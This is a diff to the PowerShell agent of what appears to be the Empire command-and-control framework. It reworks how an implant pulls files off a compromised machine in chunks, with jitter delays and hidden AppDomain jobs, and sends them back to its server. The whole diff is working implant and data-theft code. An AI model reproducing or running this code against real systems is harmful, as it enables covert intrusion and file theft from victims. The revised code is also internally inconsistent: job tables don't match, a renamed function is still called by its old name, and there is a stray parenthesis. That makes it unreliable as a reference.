@@ -131,7 +131,6 @@ function Invoke-Empire {
     #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
     $Script:Jobs = @{}
     $Script:Downloads = @{}
-
     # the currently imported script held in memory
     $script:ImportedScript = ''
 
@@ -392,36 +391,76 @@ function Invoke-Empire {
 
     $DownloadFile = @"
 function Download-File {
-    param(`$type,`$FilePath,`$ChunkSize, `$ResultID, `$Delay, `$Jitter)
+    param(`$Data,`$type,`$ResultID,`$Delay,`$Jitter)
+    try {
+        `$ChunkSize = 512KB
 
-    `$Index = 0
-    do {
-        `$EncodedPart = Get-FilePart -File "`$FilePath" -Index `$Index -ChunkSize `$ChunkSize
+        `$Parts = `$Data.Split(" ")
 
-        if (`$EncodedPart) {
-            `$data = "{0}|{1}|{2}" -f `$Index,`$FilePath,`$EncodedPart
-            Encode-Packet -type `$type -data `$(`$data) -ResultID `$ResultID
-            `$Index += 1
-
-            # if there are more parts of the file, sleep for the specified interval
-            if(`$Delay -ne 0) {
-                `$min = [int]((1-`$Jitter)*`$Delay)
-                `$max = [int]((1+`$Jitter)*`$Delay)
-
-                if(`$min -eq `$max) {
-                    `$sleepTime = `$min
+        if(`$Parts.Length -gt 1) {
+            `$Path = `$Parts[0..(`$parts.length-2)] -join " "
+            try {
+                `$ChunkSize = `$Parts[-1]/1
+                if(`$Parts[-1] -notlike "*b*") {
+                    # if MB/KB not specified, assume KB and adjust accordingly
+                    `$ChunkSize = `$ChunkSize * 1024
                 }
-                else {
-                    `$sleepTime = Get-Random -minimum `$min -maximum `$max
-                }
-
-                Start-Sleep -s `$sleepTime
+            }
+            catch {
+                # if there's an error converting the last token, assume no
+                #   chunk size is specified and add the last token onto the path
+                `$Path += " `$(`$Parts[-1])"
             }
         }
-        [GC]::Collect()
-    } while(`$EncodedPart)
+        else {
+            `$Path = `$Data
+        }
 
-    Encode-Packet -type 40 -data `$("[*] File download of `$FilePath completed") -ResultID `$ResultID
+        `$Path = `$Path.Trim('"').Trim("'")
+
+        # hardcoded floor/ceiling limits
+        if(`$ChunkSize -lt 64KB) {
+            `$ChunkSize = 64KB
+        }
+        elseif(`$ChunkSize -gt 8MB) {
+            `$ChunkSize = 8MB
+        }
+
+        # resolve the complete path
+        `$Path = Get-Childitem `$Path | ForEach-Object {`$_.FullName}
+
+        # read in and send the specified chunk size back for as long as the file has more parts
+        `$Index = 0
+        do{
+            `$EncodedPart = Get-FilePart -File "`$path" -Index `$Index -ChunkSize `$ChunkSize
+
+            if(`$EncodedPart) {
+                `$data = "{0}|{1}|{2}" -f `$Index, `$path, `$EncodedPart
+                Encode-Packet -type `$type -data `$(`$data) -ResultID `$ResultID)
+                `$Index += 1
+
+                # if there are more parts of the file, sleep for the specified interval
+                if (`$script:AgentDelay -ne 0) {
+                    `$min = [int]((1-`$Jitter)*`$Delay)
+                    `$max = [int]((1+`$Jitter)*`$Delay)
+
+                    if (`$min -eq `$max) {
+                        `$sleepTime = `$min
+                    }
+                    else{
+                        `$sleepTime = Get-Random -minimum `$min -maximum `$max;
+                    }
+                    Start-Sleep -s `$sleepTime;
+                }
+            }
+            [GC]::Collect()
+        } while(`$EncodedPart)
+
+        Encode-Packet -type 40 -data "[*] File download of `$path completed" -ResultID `$ResultID
+    }
+    catch {
+        Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID `$ResultID
+    }    
 }
 
 function Encode-Packet {
@@ -459,7 +498,6 @@ function Encode-Packet {
 
     `$packet
 }
-
 function Get-FilePart {
     Param(
         [string] `$File,
@@ -490,7 +528,7 @@ function Get-FilePart {
         }
         else{
             `$buff = new-object byte[] `$ChunkSize
-            `$Start = (`$Index * `$(`$ChunkSize))
+            `$Start = `$Index * `$(`$ChunkSize)
 
             `$null = `$FromFile.Seek(`$Start,0)
 
@@ -533,11 +571,9 @@ function Get-FilePart {
 }
 "@
 
-
     function Start-DownloadJob {
-        param($ScriptBlock,$Type, $FilePath, $ChunkSize, $ResultID)
-        
-        $JobName = Split-Path -Path $FilePath -Leaf 
+        param($ScriptString,$Type,$ResultID,$Data)
+        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
 
         # create our new AppDomain
         $AppDomain = [AppDomain]::CreateDomain($RandName)
@@ -546,8 +582,8 @@ function Get-FilePart {
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
 
         # add the target script into the new runspace/appdomain
-        $ScriptBlock = "$ScriptBlock`nDownload-File -type $Type -FilePath $FilePath -ChunkSize $ChunkSize -ResultID $ResultID -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
-        $null = $PSHost.AddScript($ScriptBlock)
+        $ScriptString = "$ScriptString`n Download-File -type $Type -Data $Data -ResultID $ResultID -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
+        $null = $PSHost.AddScript($ScriptString)
 
         # stupid v2 compatibility...
         $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
@@ -557,37 +593,33 @@ function Get-FilePart {
         # kick off asynchronous execution
         $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))
 
-        $Script:Downloads[$JobName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
-
-        $JobName
+        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
+        $RandName
     }
 
     function Get-DownloadJobCompleted {
         param($JobName)
-        
-        if ($Script:Downloads.ContainsKey($JobName)) {
+        if($Script:Downloads.ContainsKey($JobName)) {
             $Script:Downloads[$JobName]['Job'].IsCompleted
         }
     }
 
-    function Receive-DownloadJob {
+    function Receive-AgentJob {
         param($JobName)
-        
-        if ($Script:Downloads.ContainsKey($JobName)) {
+        if($Script:Downloads.ContainsKey($JobName)) {
             $Script:Downloads[$JobName]['Buffer'].ReadAll()
         }
     }
 
     function Stop-DownloadJob {
         param($JobName)
-        
-        if ($Script:Downloads.ContainsKey($JobName)) {
-            #kill the PS host
-            $null = $Script:Downloads[$JobName]['PSHost'].Stop()
+        if($Script:Downloads.ContainsKey($JobName)) {
+            # kill the PS host
+            $Null = $Script:Downloads[$JobName]['PSHost'].Stop()
             # get results
             $Script:Downloads[$JobName]['Buffer'].ReadAll()
             # unload the app domain runner
-            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
+            $Null = [AppDomain]::Unload($Script:Downloads[$JobName]['AppDomain'])
             $Script:Downloads.Remove($JobName)
         }
     }
@@ -994,53 +1026,10 @@ function Get-FilePart {
                     Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID
                 }
             }
-            # background file download
+            # file download
             elseif($type -eq 41) {
-                
-                try {
-                    $ChunkSize = 512KB
-                    $Parts = $Data.Split(" ")
-
-                    if($Parts.Length -gt 1) {
-                        $Path = $Parts[0..($parts.length-2)] -join " "
-                        try {
-                            $ChunkSize = $Parts[-1]/1
-                            if($Parts[-1] -notlike "*b*") {
-                                # if MB/KB not specified, assume KB and adjust accordingly
-                                $ChunkSize = $ChunkSize * 1024
-                            }
-                        }
-                        catch {
-                            # if there's an error converting the last token, assume no
-                            #   chunk size is specified and add the last token onto the path
-                            $Path += " $($Parts[-1])"
-                        }
-                    }
-                    else {
-                        $Path = $Data
-                    }
-
-                    $Path = $Path.Trim('"').Trim("'")
-
-                    # hardcoded floor/ceiling limits
-                    if($ChunkSize -lt 32KB) {
-                        $ChunkSize = 32KB
-                    }
-                    elseif($ChunkSize -gt 4MB) {
-                        $ChunkSize = 4MB
-                    }
-
-                    # resolve the complete path 
-                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
-                    
-                    # Pass the the path to the Start-DownloadJob function
-                    $jobID = Start-DownloadJob -ScriptBlock $DownloadFile -Type $Type -FilePath $Path -ChunkSize $ChunkSize -ResultID $ResultID
-                    $script:ResultIDs[$jobID]=$ResultID
-                }
-                catch {
-                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
-                }
-                
+                $jobID = Start-DownloadJob -ScriptString $DownloadFile -Type $type -ResultID $ResultID -Data $Data
+                $script:ResultIDs[$jobID]=$ResultID
             }
             # file upload
             elseif($type -eq 42) {
@@ -1288,6 +1277,7 @@ function Get-FilePart {
 
         # poll running jobs, receive any data, and remove any completed jobs
         $JobResults = $Null
+        $DownloadResults = $Null
         ForEach($JobName in $Script:Jobs.Keys) {
             $JobResultID = $script:ResultIDs[$JobName]
             # check if the job is still running
@@ -1306,24 +1296,22 @@ function Get-FilePart {
 
         ForEach($JobName in $Script:Downloads.Keys) {
             $JobResultID = $script:ResultIDs[$JobName]
-            # check if the download is still running
-            if (Get-DownloadJobCompleted -JobName $JobName) {
-                # the download is finished, retrieve file data
+            # check if the job is still running
+            if(Get-DownloadJobCompleted -JobName $JobName) {
+                # the job has stopped, so receive results/cleanup
                 $Results = Stop-DownloadJob -JobName $JobName
-                Write-Host "[+] Download complete for: $JobName, Final chuck size: $($Results.Length)"
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                Write-Host "[+] Data chunk size: $($Results.Length)"
             }
 
-            if ($Results) {
-                $JobResults += $Results
+            if($Results) {
+                $DownloadResults += $Results
             }
         }
 
         if ($JobResults) {
-            Send-Message -Packets $JobResults
+            Send-Message -Packets $($JobResults + $DownloadResults)
         }
 
         # get the next task from the server
